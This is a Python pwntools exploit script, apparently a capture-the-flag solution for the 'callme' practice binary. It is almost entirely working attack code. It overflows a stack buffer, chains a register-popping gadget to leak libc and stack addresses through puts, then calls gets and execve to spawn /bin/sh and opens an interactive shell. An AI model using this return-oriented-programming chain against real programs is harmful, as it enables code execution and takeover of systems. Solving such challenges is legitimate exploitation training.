#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'.'
# Stripped:   No

RIP_DIST = 40

CAFEBABE = 0xcafebabecafebabe
DEADBEEF = 0xdeadbeefdeadbeef
DOODFOOD = 0xd00df00dd00df00d

POP_RDI_RSI_RDX = 0x000000000040093c

log.info("args go into rdi, rsi, rdx. need to be reset between calls. they gave us a nice gadget")

io = start()

pause()

io.clean()
io.sendline(cyclic(40) +
            flat(POP_RDI_RSI_RDX) + flat(exe.got['puts']) + flat(CAFEBABE) + flat(DOODFOOD) +
            flat(exe.symbols['puts']) +
            flat(exe.symbols['pwnme'])
    )
io.readline() # garbage
puts_libc = u64(io.readline().strip().ljust(8, b'\0'))
libc_base = puts_libc - exe.libc.symbols['puts']
log.info(f"leaked puts = {hex(puts_libc)}")
log.info(f"libc base = {hex(libc_base)}")

io.clean()
io.sendline(cyclic(40) +
            flat(POP_RDI_RSI_RDX) + flat(libc_base + exe.libc.symbols['environ']) + flat(0) + flat(0) +
            flat(exe.symbols['puts']) +
            flat(exe.symbols['pwnme'])
            )
io.readline()
stack_leak = u64(io.readline().strip().ljust(8, b'\0'))
stack_pivot = stack_leak + 0x1000
log.info(f"stack leak = {hex(stack_leak)}")

io.clean()
io.sendline(cyclic(40) +
            flat(POP_RDI_RSI_RDX) + flat(stack_pivot) + flat(0) + flat(0) +
            flat(libc_base + exe.libc.symbols['gets']) +
            flat(POP_RDI_RSI_RDX) + flat(stack_pivot) + flat(0) + flat(0) +
            flat(libc_base + exe.libc.symbols['execve'])
            )
io.sendline(b'/bin/sh')
io.interactive()

